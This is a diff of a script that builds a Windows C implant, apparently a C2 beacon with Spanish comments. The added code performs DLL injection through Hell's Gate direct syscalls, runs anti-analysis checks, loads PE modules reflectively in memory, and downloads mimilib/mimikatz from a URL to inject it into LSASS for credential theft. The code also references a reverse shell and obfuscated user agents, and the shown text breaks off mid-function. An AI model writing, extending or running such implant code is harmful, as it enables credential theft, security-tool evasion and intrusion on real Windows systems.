@@ -174,7 +174,7 @@ echo "OUTPUT: $OUTPUT"
 cat > Makefile << EOF
 .PHONY: windows clean
 windows: beacon.c
-	x86_64-w64-mingw32-gcc beacon.c aes.c cJSON.c -o $OUTPUT -lwinhttp -lcrypt32 -lws2_32 -liphlpapi -lbcrypt -lshlwapi -DUNICODE -D_UNICODE 
+	x86_64-w64-mingw32-gcc beacon.c aes.c cJSON.c -o $OUTPUT -lwinhttp -lcrypt32 -lws2_32 -liphlpapi -lbcrypt -lshlwapi -lrpcrt4 -DUNICODE -D_UNICODE 
 clean:
 	#rm -f $OUTPUT beacon.c
 EOF
@@ -209,6 +209,8 @@ cat > beacon.c << EOF
 #include "cJSON.h"
 
 #pragma warning(disable: 4005)
+#pragma comment(lib, "secur32.lib")
+#pragma comment(lib, "rpcrt4.lib")
 #pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "advapi32.lib")
@@ -266,10 +268,13 @@ unsigned char OBF_USER_AGENT[] = { $OBF_UA_BYTES, 0 };
 #ifndef SECURITY_FLAG_IGNORE_INVALID_POLICY
 #define SECURITY_FLAG_IGNORE_INVALID_POLICY   0x00000020
 #endif
-
+#ifndef _SECURITY_PACKAGE_DEFINITION_
+#define _SECURITY_PACKAGE_DEFINITION_
+#endif 
 #ifndef _PROCESS_BASIC_INFORMATION_
 #define _PROCESS_BASIC_INFORMATION_
-
+#ifndef _SP_LSA_MODE_INITIALIZE_DEFINED_
+#define _SP_LSA_MODE_INITIALIZE_DEFINED_
 
 #endif
 
@@ -355,120 +360,32 @@ static ProxyListener proxyListeners[10];
 static int numProxyListeners = 0;
 static BOOL proxyInitialized = FALSE;
 
+// === FIRMA DE SpLsaModeInitialize (MinGW compatible) ===
+
+typedef NTSTATUS (NTAPI *SpLsaModeInitialize_t)(
+    ULONG LsaVersion,
+    PULONG PackageVersion,
+    void** ppTables,      
+    PULONG pcTables
+);
+
+#endif // _SECURITY_PACKAGE_DEFINITION_
+
+// === DEFINICIÓN DE SpLsaModeInitialize (firma estándar) ===
+#ifndef SECURITY_KERNEL
+typedef NTSTATUS (NTAPI *PSECPKG_KERNEL_FUNCTION)(
+    PVOID PackageContext,
+    PVOID Argument1,
+    PVOID Argument2
+);
+#endif
+
 
 // Clave AES-256 en bytes
 const char* aes_key_hex = "$AES_KEY";
 
 BYTE aes_key[32];
 
-// Stub para __iob_func
-// === STUBS CRT ===
-static int _fake_locks[32];
-// === STUB CRT MEJORADO PARA __iob_func ===
-FILE _fake_iob[3];
-
-__declspec(noinline) FILE* __cdecl stub___iob_func(void) {
-    static int inited = 0;
-    if (!inited) {
-        // Inicializa stdin (0)
-        _fake_iob[0]._file = 0;
-        _fake_iob[0]._flag = 0x0080; // _IOREAD
-
-        // Inicializa stdout (1) - ¡CRÍTICO PARA vfprintf!
-        _fake_iob[1]._file = 1;
-        _fake_iob[1]._flag = 0x0040; // _IOWRT
-        _fake_iob[1]._base = (char*)1; // Dirección no nula para evitar crash
-        _fake_iob[1]._ptr = (char*)1;
-        _fake_iob[1]._cnt = 0;
-
-        // Inicializa stderr (2)
-        _fake_iob[2]._file = 2;
-        _fake_iob[2]._flag = 0x0040; // _IOWRT
-        _fake_iob[2]._base = (char*)1;
-        _fake_iob[2]._ptr = (char*)1;
-        _fake_iob[2]._cnt = 0;
-
-        inited = 1;
-    }
-    return _fake_iob;
-}
-
-void __cdecl stub__lock(int locknum) {
-    // Simulamos un lock básico (sin real critical section)
-    // Podrías usar InterlockedExchange si quieres simular bloqueo
-    // Pero para evitar crashes, simplemente no hagas nada o simula
-    if (locknum >= 0 && locknum < 32) {
-        // Marca como "ocupado" (muy básico)
-        volatile int* lock = &_fake_locks[locknum];
-        // No podemos usar EnterCriticalSection, pero evitamos que el CRT crashee
-        // Simplemente no hagas nada → mejor que crash
-    }
-    return;
-}
-
-void __cdecl stub__unlock(int locknum) {
-    if (locknum >= 0 && locknum < 32) {
-        volatile int* lock = &_fake_locks[locknum];
-        // Simulamos liberación
-    }
-    return;
-}
-
-int __cdecl stub__dup2(int oldfd, int newfd) {
-    // Simplemente devuelve newfd (comportamiento básico)
-    return newfd;
-}
-
-int __cdecl stub__setmaxstdio(int newmax) {
-    return 512; // valor por defecto
-}
-
-// 2. _amsg_exit: evita popup de error del CRT
-void __cdecl stub__amsg_exit(int) {
-    return;
-}
-
-// 3. _initterm: inicializa constructores C++
-
-void __cdecl stub__initterm(_PVFV* first, _PVFV* last) {
-    // Recorremos los constructores globales, pero sin SEH
-    // Si hay un crash, que el VEH lo maneje, no aquí
-    while (first < last) {
-        if (*first != NULL) {
-            (*first)();
-        }
-        first++;
-    }
-}
-// 4. abort: evita salida abrupta
-void __cdecl stub_abort(void) {
-    return; // o ExitProcess(1) si prefieres
-}
-
-// 5. calloc: asigna memoria y la llena con ceros
-void* __cdecl stub_calloc(size_t num, size_t size) {
-    size_t total = num * size;
-    void* mem = VirtualAlloc(NULL, total, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (mem) memset(mem, 0, total);
-    return mem;
-}
-
-// 6. free: libera memoria
-void __cdecl stub_free(void* ptr) {
-    if (ptr) VirtualFree(ptr, 0, MEM_RELEASE);
-}
-
-// 7. realloc: redimensiona memoria
-void* __cdecl stub_realloc(void* ptr, size_t size) {
-    if (!ptr) return stub_calloc(1, size);
-    void* new_ptr = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (new_ptr && size > 0) {
-        // No conocemos el tamaño original, pero copiamos hasta `size`
-        memcpy(new_ptr, ptr, size);
-        VirtualFree(ptr, 0, MEM_RELEASE);
-    }
-    return new_ptr;
-}
 
 // User-Agents (como en tu Go)
 const char* USER_AGENTS[] = {
@@ -650,15 +567,47 @@ BOOL isValidUUID(const char* uuid);
 unsigned char* DownloadToBuffer(const char* url, DWORD* fileSize);
 BOOL is_64bit(BYTE* buffer);
 BOOL FileExistsA(const char* filePath);
-
-void __cdecl stub_abort(void);
-void* __cdecl stub_calloc(size_t, size_t);
-void __cdecl stub_free(void*);
-void* __cdecl stub_realloc(void*, size_t);
+HMODULE MapDllNameToModule(char* dllName);
+void ExecuteTLSCallbacks(PVOID moduleBase);
+PVOID MapModuleToMemory(unsigned char* fileBuffer, DWORD fileSize);
+BOOL ExecuteModule(PVOID moduleBase);
 void __cdecl ReverseShell(void* arg);
 void cleanupProxy();
+BOOL anti_analysis(void);
+HMODULE GetNtdllBase(void);
+
+
 // === HELL'S GATE + HELLDESCENT ===
 static volatile DWORD __syscall_ssn = 0;
+typedef NTSTATUS (NTAPI *SpLsaModeInitialize_t)(ULONG, PULONG, void**, PULONG);
+// === MAP DLL NAME TO REAL DLL ===
+HMODULE MapDllNameToModule(char* dllName) {
+    if (strstr(dllName, "api-ms-win-crt")) {
+        return GetModuleHandleA("ucrtbase.dll");
+    }
+    if (strstr(dllName, "api-ms-win-core")) {
+        return GetModuleHandleA("kernel32.dll");
+    }
+    if (strstr(dllName, "api-ms-win-security")) {
+        return GetModuleHandleA("advapi32.dll");
+    }
+    if (strstr(dllName, "api-ms-win-sspi")) {
+        return GetModuleHandleA("secur32.dll");
+    }
+    if (strstr(dllName, "KERBEROS")) {
+        return GetModuleHandleA("SECUR32.DLL");
+    }
+    if (strstr(dllName, "RPCRT4")) {
+        return GetModuleHandleA("RPCRT4.DLL");
+    }
+    if (strstr(dllName, "CRYPT32")) {
+        return GetModuleHandleA("CRYPT32.DLL");
+    }
+    if (strstr(dllName, "ADVAPI32")) {
+        return GetModuleHandleA("ADVAPI32.DLL");
+    }
+    return LoadLibraryA(dllName);
+}
 
 DWORD GetSyscallNumber(PVOID func_addr) {
     if (!func_addr) return 0;
@@ -693,6 +642,193 @@ NTSTATUS HellDescent(
     );
 }
 
+// === INYECTAR DLL EN CUALQUIER PROCESO (reutiliza tu EarlyBird) ===
+BOOL InjectDLLToProcess(DWORD pid, unsigned char* dllBuffer, DWORD dllSize) {
+    if (anti_analysis()) {
+        printf("[-] Entorno de análisis detectado. Saliendo.\n");
+        fflush(stdout);
+        return FALSE;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProcess) {
+        printf("[-] No se pudo abrir el proceso (PID: %lu)\n", pid);
+        fflush(stdout);
+        return FALSE;
+    }
+
+    HMODULE ntdll = GetNtdllBase();
+    if (!ntdll) {
+        printf("[-] No se pudo obtener ntdll.dll\n");
+        fflush(stdout);
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+
+    PVOID pNtAllocate = GetProcAddress(ntdll, "NtAllocateVirtualMemory");
+    PVOID pNtWrite      = GetProcAddress(ntdll, "NtWriteVirtualMemory");
+    PVOID pNtQueueApc   = GetProcAddress(ntdll, "NtQueueApcThread");
+    PVOID pNtResume     = GetProcAddress(ntdll, "NtResumeThread");
+
+    if (!pNtAllocate || !pNtWrite || !pNtQueueApc || !pNtResume) {
+        printf("[-] No se pudieron obtener funciones de ntdll\n");
+        fflush(stdout);
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+
+    DWORD ssn_alloc = GetSyscallNumber(pNtAllocate);
+    DWORD ssn_write = GetSyscallNumber(pNtWrite);
+    DWORD ssn_apc   = GetSyscallNumber(pNtQueueApc);
+    DWORD ssn_resume = GetSyscallNumber(pNtResume);
+
+    if (!ssn_alloc || !ssn_write || !ssn_apc || !ssn_resume) {
+        printf("[-] No se pudo obtener SSN de alguna función\n");
+        fflush(stdout);
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+
+    SIZE_T size = dllSize;
+    LPVOID pRemoteMem = NULL;
+
+    // 🔹 NtAllocateVirtualMemory
+    HellsGate(ssn_alloc);
+    NTSTATUS status = HellDescent(
+        (DWORD64)hProcess,
+        (DWORD64)&pRemoteMem,
+        0,
+        (DWORD64)&size,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_READWRITE
+    );
+    if (status != STATUS_SUCCESS) {
+        printf("[-] NtAllocateVirtualMemory falló: 0x%08lX\n", (unsigned long)status);
+        fflush(stdout);
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+    printf("[+] Memoria remota asignada: 0x%p\n", pRemoteMem);
+    fflush(stdout);
+
+    // 🔹 NtWriteVirtualMemory
+    HellsGate(ssn_write);
+    status = HellDescent(
+        (DWORD64)hProcess,
+        (DWORD64)pRemoteMem,
+        0,
+        (DWORD64)dllBuffer,
+        (DWORD64)dllSize,
+        0
+    );
+    if (status != STATUS_SUCCESS) {
+        printf("[-] NtWriteVirtualMemory falló: 0x%08lX\n", (unsigned long)status);
+        fflush(stdout);
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+    printf("[+] DLL escrita en proceso remoto.\n");
+    fflush(stdout);
+
+    // 🔹 NtQueueApcThread: apunta a LoadLibraryA(pRemoteMem)
+    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+    if (!hKernel32) {
+        printf("[-] No se pudo obtener kernel32.dll\n");
+        fflush(stdout);
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+
+    PVOID pLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");
+    if (!pLoadLibraryA) {
+        printf("[-] No se pudo obtener LoadLibraryA\n");
+        fflush(stdout);
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+
+    // Crear hilo suspendido para usar APC
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, pRemoteMem, CREATE_SUSPENDED, NULL);
+    if (!hThread) {
+        printf("[-] CreateRemoteThread (suspended) falló\n");
+        fflush(stdout);
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+
+    // 🔹 NtQueueApcThread
+    HellsGate(ssn_apc);
+    status = HellDescent(
+        (DWORD64)hThread,
+        (DWORD64)pLoadLibraryA,
+        (DWORD64)pRemoteMem,
+        0, 0, 0
+    );
+    if (status != STATUS_SUCCESS) {
+        printf("[-] NtQueueApcThread falló: 0x%08lX\n", (unsigned long)status);
+        fflush(stdout);
+        CloseHandle(hThread);
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+    printf("[+] APC enqueued via NtQueueApcThread.\n");
+    fflush(stdout);
+
+    // 🔹 NtResumeThread
+    DWORD suspendCount;
+    HellsGate(ssn_resume);
+    status = HellDescent(
+        (DWORD64)hThread,
+        (DWORD64)&suspendCount,
+        0, 0, 0, 0
+    );
+    if (status != STATUS_SUCCESS) {
+        printf("[-] NtResumeThread falló: 0x%08lX\n", (unsigned long)status);
+        fflush(stdout);
+        CloseHandle(hThread);
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+    printf("[+] Hilo reanudado. LoadLibraryA en ejecución.\n");
+    fflush(stdout);
+
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
+    return TRUE;
+}
+DWORD GetProcessIdByName(const char* processName) {
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    PROCESSENTRY32 pe = {0};
+    pe.dwSize = sizeof(PROCESSENTRY32);
+    if (Process32First(hSnapshot, &pe)) {
+        do {
+            if (lstrcmpiW(pe.szExeFile, TEXT("lsass.exe")) == 0){
+                CloseHandle(hSnapshot);
+                return pe.th32ProcessID;
+            }
+        } while (Process32NextW(hSnapshot, &pe));
+    }
+    CloseHandle(hSnapshot);
+    return 0;
+}
+// === EJECUTAR TLS CALLBACKS ===
+void ExecuteTLSCallbacks(PVOID moduleBase) {
+    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)moduleBase;
+    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)moduleBase + dos->e_lfanew);
+    
+    IMAGE_DATA_DIRECTORY* tlsDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
+    if (tlsDir->Size == 0 || !tlsDir->VirtualAddress) return;
+
+    IMAGE_TLS_DIRECTORY* tls = (IMAGE_TLS_DIRECTORY*)((BYTE*)moduleBase + tlsDir->VirtualAddress);
+    if (!tls->AddressOfCallBacks) return;
+
+    PIMAGE_TLS_CALLBACK* callbacks = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;
+    for (DWORD i = 0; callbacks[i]; i++) {
+        callbacks[i](moduleBase, DLL_PROCESS_ATTACH, NULL);
+    }
+}
 // === Carga un módulo en memoria ===
 PVOID MapModuleToMemory(unsigned char* fileBuffer, DWORD fileSize) {
     IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)fileBuffer;
@@ -712,29 +848,32 @@ PVOID MapModuleToMemory(unsigned char* fileBuffer, DWORD fileSize) {
     IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(ntHeaders);
     for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
         if (sections[i].PointerToRawData && sections[i].SizeOfRawData) {
-            memcpy((BYTE*)baseAddress + sections[i].VirtualAddress, fileBuffer + sections[i].PointerToRawData, sections[i].SizeOfRawData);
+            memcpy((BYTE*)baseAddress + sections[i].VirtualAddress,
+                   fileBuffer + sections[i].PointerToRawData,
+                   sections[i].SizeOfRawData);
         }
     }
 
-    // Ajustar ImageBase
-    DWORD_PTR delta = (DWORD_PTR)baseAddress - ntHeaders->OptionalHeader.ImageBase;
-    if (delta != 0) {
-        // Reubicación
-        IMAGE_DATA_DIRECTORY* relocDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
-        if (relocDir->Size > 0) {
-            BYTE* reloc = (BYTE*)baseAddress + relocDir->VirtualAddress;
-            while (reloc < (BYTE*)baseAddress + relocDir->VirtualAddress + relocDir->Size) {
-                IMAGE_BASE_RELOCATION* block = (IMAGE_BASE_RELOCATION*)reloc;
-                if (block->SizeOfBlock == 0) break;
-                WORD* entry = (WORD*)(block + 1);
-                for (DWORD i = 0; i < (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2; i++) {
-                    if ((entry[i] & 0xF000) == 0x3000) {
-                        DWORD_PTR* patchAddr = (DWORD_PTR*)((BYTE*)baseAddress + block->VirtualAddress + (entry[i] & 0x0FFF));
-                        *patchAddr += delta;
-                    }
+    // Reubicaciones
+    IMAGE_DATA_DIRECTORY* relocDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+    if (relocDir->Size > 0 && relocDir->VirtualAddress > 0) {
+        BYTE* reloc = (BYTE*)baseAddress + relocDir->VirtualAddress;
+        BYTE* relocEnd = reloc + relocDir->Size;
+
+        while (reloc < relocEnd && *(DWORD*)reloc) {
+            IMAGE_BASE_RELOCATION* block = (IMAGE_BASE_RELOCATION*)reloc;
+            if (block->SizeOfBlock < sizeof(IMAGE_BASE_RELOCATION)) break;
+
+            DWORD count = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
+            WORD* entry = (WORD*)(block + 1);
+
+            for (DWORD i = 0; i < count; i++) {
+                if ((entry[i] & 0xF000) == 0x3000) {
+                    DWORD_PTR* patchAddr = (DWORD_PTR*)((BYTE*)baseAddress + block->VirtualAddress + (entry[i] & 0x0FFF));
+                    *patchAddr += (DWORD_PTR)baseAddress - ntHeaders->OptionalHeader.ImageBase;
                 }
-                reloc += block->SizeOfBlock;
             }
+            reloc += block->SizeOfBlock;
         }
     }
 
@@ -745,14 +884,14 @@ PVOID MapModuleToMemory(unsigned char* fileBuffer, DWORD fileSize) {
 
         for (; importDesc->Name; importDesc++) {
             char* dllName = (char*)((BYTE*)baseAddress + importDesc->Name);
-            printf("[*] Cargando DLL de importación: %s\n", dllName);
+            printf("[I] Cargando DLL: %s\n", dllName);  // Log para depuración
             fflush(stdout);
 
-            HMODULE hDll = LoadLibraryA(dllName);
+            HMODULE hDll = MapDllNameToModule(dllName);  // ✅ Usa la función auxiliar
             if (!hDll) {
                 printf("[-] No se pudo cargar: %s\n", dllName);
                 fflush(stdout);
-                VirtualFree(baseAddress, 0, MEM_RELEASE);
+                VirtualFree(baseAddress, 0, MEM_RELEASE);  // ✅ baseAddress está definido
                 return NULL;
             }
 
@@ -763,135 +902,57 @@ PVOID MapModuleToMemory(unsigned char* fileBuffer, DWORD fileSize) {
 
             for (; origThunk->u1.AddressOfData; origThunk++, firstThunk++) {
                 if (origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
-                    WORD ordinal = (WORD)(origThunk->u1.Ordinal & 0xFFFF);
-                    printf("[IAT] Resolviendo por ordinal: %s!%hu\n", dllName, ordinal);
-                    fflush(stdout);
-                    firstThunk->u1.Function = (ULONG_PTR)GetProcAddress(hDll, MAKEINTRESOURCEA(ordinal));
+                    firstThunk->u1.Function = (ULONG_PTR)GetProcAddress(hDll, (LPCSTR)(origThunk->u1.Ordinal & 0xFFFF));
                 } else {
                     IMAGE_IMPORT_BY_NAME* import = (IMAGE_IMPORT_BY_NAME*)((BYTE*)baseAddress + origThunk->u1.AddressOfData);
-                    char* funcName = (char*)import->Name;
-                    printf("[IAT] Resolviendo: %s!%s\n", dllName, funcName);
-                    fflush(stdout);
-
-                    if (strcmp(funcName, "__iob_func") == 0) {
-                        printf("[IAT] Usando stub para __iob_func\n");
-                        fflush(stdout);
-                        firstThunk->u1.Function = (ULONG_PTR)stub___iob_func;
-                    }
-                    else if (strcmp(funcName, "_amsg_exit") == 0) {
-                        printf("[IAT] Usando stub para _amsg_exit\n");
-                        fflush(stdout);
-                        firstThunk->u1.Function = (ULONG_PTR)stub__amsg_exit;
-                    }
-                    else if (strcmp(funcName, "_initterm") == 0) {
-                        printf("[IAT] Usando stub para _initterm\n");
-                        fflush(stdout);
-                        firstThunk->u1.Function = (ULONG_PTR)stub__initterm;
-                    }
-                    else if (strcmp(funcName, "abort") == 0) {
-                        printf("[IAT] Usando stub para abort\n");
-                        fflush(stdout);
-                        firstThunk->u1.Function = (ULONG_PTR)stub_abort;
-                    }
-                    else if (strcmp(funcName, "calloc") == 0) {
-                        printf("[IAT] Usando stub para calloc\n");
-                        fflush(stdout);
-                        firstThunk->u1.Function = (ULONG_PTR)stub_calloc;
-                    }
-                    else if (strcmp(funcName, "free") == 0) {
-                        printf("[IAT] Usando stub para free\n");
-                        fflush(stdout);
-                        firstThunk->u1.Function = (ULONG_PTR)stub_free;
-                    }
-                    else if (strcmp(funcName, "realloc") == 0) {
-                        printf("[IAT] Usando stub para realloc\n");
-                        fflush(stdout);
-                        firstThunk->u1.Function = (ULONG_PTR)stub_realloc;
-                    }
-                    else if (strcmp(funcName, "_dup2") == 0) {
-                        printf("[IAT] Usando stub para _dup2\n");
-                        fflush(stdout);
-                        firstThunk->u1.Function = (ULONG_PTR)stub__dup2;
-                    }
-                    else if (strcmp(funcName, "_setmaxstdio") == 0) {
-                        firstThunk->u1.Function = (ULONG_PTR)stub__setmaxstdio;
-                    }
-                    else {
-                        firstThunk->u1.Function = (ULONG_PTR)GetProcAddress(hDll, funcName);
-                    }               
+                    firstThunk->u1.Function = (ULONG_PTR)GetProcAddress(hDll, (LPCSTR)import->Name);
                 }
-
                 if (!firstThunk->u1.Function) {
-                    printf("[-] ADVERTENCIA: No se resolvió: %s!%p\n", dllName, (void*)origThunk->u1.AddressOfData);
+                    printf("[-] ADVERTENCIA: No resuelto: %s!%p\n", dllName, (void*)origThunk->u1.AddressOfData);
                     fflush(stdout);
-                    // No retornes NULL aquí — algunas funciones pueden no existir
                 }
             }
         }
-    } else {
-        printf("[!] No hay IAT o está vacía\n");
-        fflush(stdout);
     }
 
-    return baseAddress;
+    return baseAddress;  // ✅ Retorna baseAddress
 }
 
 // === Ejecuta el módulo (DllMain o EntryPoint) ===
 BOOL ExecuteModule(PVOID moduleBase) {
-    // Registrar manejador de excepciones
-    PVOID vectoredHandler = AddVectoredExceptionHandler(1, ExceptionFilter);
-    if (!vectoredHandler) {
-        printf("[-] No se pudo registrar el manejador de excepciones\n");
+    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)moduleBase;
+    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)moduleBase + dosHeader->e_lfanew);  // ✅ Declarado
+
+    if (ntHeaders->OptionalHeader.AddressOfEntryPoint == 0) {
+        return TRUE;
+    }
+
+    PVOID entryPoint = (BYTE*)moduleBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;  // ✅ Declarado
+
+    // ✅ Ejecutar TLS callbacks antes de DllMain
+    ExecuteTLSCallbacks(moduleBase);
+
+    if (ntHeaders->FileHeader.Characteristics & IMAGE_FILE_DLL) {
+        typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);
+        DllMain_t DllMain = (DllMain_t)entryPoint;
+
+        // Llamar a DllMain
+        if (DllMain((HINSTANCE)moduleBase, DLL_PROCESS_ATTACH, NULL)) {
+            return TRUE;
+        } else {
+            printf("[-] DllMain devolvió FALSE\n");
+            fflush(stdout);
+            return FALSE;
+        }
+    } else {
+        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entryPoint, NULL, 0, NULL);
+        if (hThread) {
+            WaitForSingleObject(hThread, INFINITE);
+            CloseHandle(hThread);
+            return TRUE;
+        }
         return FALSE;
     }
-
-    BOOL result = FALSE;
-
-    if (setjmp(exceptionJump) == 0) {
-        // Bloque protegido
-        IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)moduleBase;
-        IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)moduleBase + dosHeader->e_lfanew);
-
-        if (ntHeaders->OptionalHeader.AddressOfEntryPoint == 0) {
-            result = TRUE;
-            goto cleanup;
-        }
-
-        PVOID entryPoint = (BYTE*)moduleBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
-
-        if (ntHeaders->FileHeader.Characteristics & IMAGE_FILE_DLL) {
-            printf("[*] Llamando a DllMain en: 0x%p\n", entryPoint);
-            fflush(stdout);
-
-            typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);
-            DllMain_t DllMain = (DllMain_t)entryPoint;
-
-            // DllMain((HINSTANCE)moduleBase, DLL_PROCESS_ATTACH, NULL);
-
-            typedef BOOL (WINAPI *DllMainCRTStartup_t)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
-            DllMainCRTStartup_t DllMainCRTStartup = (DllMainCRTStartup_t)entryPoint;
-
-            DllMainCRTStartup((HINSTANCE)moduleBase, DLL_PROCESS_ATTACH, NULL);
-        } else {
-            HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entryPoint, NULL, 0, NULL);
-            if (hThread) {
-                CloseHandle(hThread);
-                result = TRUE;
-            } else {
-                result = FALSE;
-                goto cleanup;
-            }
-        }
-        result = TRUE;
-    } else {
-        // Se capturó una EXCEPCIÓN (ej: acceso inválido)
-        printf("[-] Excepción capturada: acceso inválido durante ejecución del módulo\n");
-        result = FALSE;
-    }
-
-cleanup:
-    RemoveVectoredExceptionHandler(vectoredHandler);
-    return result;
 }
 
 // === Carga y ejecuta un módulo desde URL ===
@@ -899,6 +960,127 @@ BOOL LoadModuleFromURL(const char* url) {
     printf("[*] Cargando módulo desde: %s\n", url);
     fflush(stdout);
 
+    // === ¿Es mimilib.dll? → inyectar en LSASS vía LoadLibraryA ===
+    if (strstr(url, "mimilib.dll") || strstr(url, "mimikatz")) {
+        printf("[*] Módulo especial detectado: inyectando en LSASS\n");
+        fflush(stdout);
+
+        // --- 1. Anti-análisis ---
+        if (anti_analysis()) {
+            printf("[-] Entorno de análisis detectado\n");
+            fflush(stdout);
+            return FALSE;
+        }
+
+        // --- 2. Buscar PID de LSASS ---
+        DWORD lsassPid = GetProcessIdByName("lsass.exe");
+        if (lsassPid == 0) {
+            printf("[-] No se encontró LSASS\n");
+            fflush(stdout);
+            return FALSE;
+        }
+
+        printf("[+] LSASS encontrado: PID=%lu\n", lsassPid);
+        fflush(stdout);
+
+        // --- 3. Descargar DLL a disco temporal ---
+        char tempPath[MAX_PATH];
+        GetTempPathA(MAX_PATH, tempPath);
+        strcat_s(tempPath, MAX_PATH, "mimilib.dll");
+
+        DWORD fileSize = 0;
+        unsigned char* dllBuffer = DownloadToBuffer(url, &fileSize);
+        if (!dllBuffer || fileSize == 0) {
+            printf("[-] Fallo al descargar DLL\n");
+            return FALSE;
+        }
+
+        HANDLE hFile = CreateFileA(tempPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hFile == INVALID_HANDLE_VALUE) {
+            printf("[-] No se pudo crear archivo temporal\n");
+            free(dllBuffer);
+            return FALSE;
+        }
+
+        DWORD written;
+        WriteFile(hFile, dllBuffer, fileSize, &written, NULL);
+        CloseHandle(hFile);
+        free(dllBuffer);
+
+        printf("[+] DLL guardada en: %s\n", tempPath);
+        fflush(stdout);
+
+        // --- 4. Abrir proceso LSASS ---
+        HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, lsassPid);
+        if (!hProcess) {
+            printf("[-] No se pudo abrir LSASS (¿PPL activo?)\n");
+            fflush(stdout);
+            return FALSE;
+        }
+
+        // --- 5. Alocar memoria para la ruta ---
+        LPVOID pRemotePath = VirtualAllocEx(hProcess, NULL, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (!pRemotePath) {
+            printf("[-] VirtualAllocEx falló\n");
+            CloseHandle(hProcess);
+            return FALSE;
+        }
+
+        // --- 6. Escribir ruta en memoria remota ---
+        if (!WriteProcessMemory(hProcess, pRemotePath, tempPath, strlen(tempPath) + 1, NULL)) {
+            printf("[-] WriteProcessMemory falló (ruta)\n");
+            VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
+            CloseHandle(hProcess);
+            return FALSE;
+        }
+
+        // --- 7. Obtener LoadLibraryA ---
+        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+        if (!hKernel32) {
+            printf("[-] No se pudo obtener kernel32.dll\n");
+            VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
+            CloseHandle(hProcess);
+            return FALSE;
+        }
+
+        PVOID pLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");
+        if (!pLoadLibraryA) {
+            printf("[-] No se pudo obtener LoadLibraryA\n");
+            VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
+            CloseHandle(hProcess);
+            return FALSE;
+        }
+
+        // --- 8. Crear hilo remoto ---
+        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, pRemotePath, 0, NULL);
+        if (!hThread) {
+            printf("[-] CreateRemoteThread falló\n");
+            VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
+            CloseHandle(hProcess);
+            return FALSE;
+        }
+
+        WaitForSingleObject(hThread, 5000);
+        CloseHandle(hThread);
+        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+
+        printf("[+] Inyección en LSASS completada: LoadLibraryA('%s')\n", tempPath);
+        fflush(stdout);
+
+        // --- 9. Verificar activación ---
+        HANDLE hLog = CreateFileA("C:\\\\Windows\\\\System32\\\\mimilsa.log", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
+        if (hLog != INVALID_HANDLE_VALUE) {
+            printf("[+] Éxito: mimilsa.log creado → mimilib activado\n");
+            CloseHandle(hLog);
+            return TRUE;
+        } else {
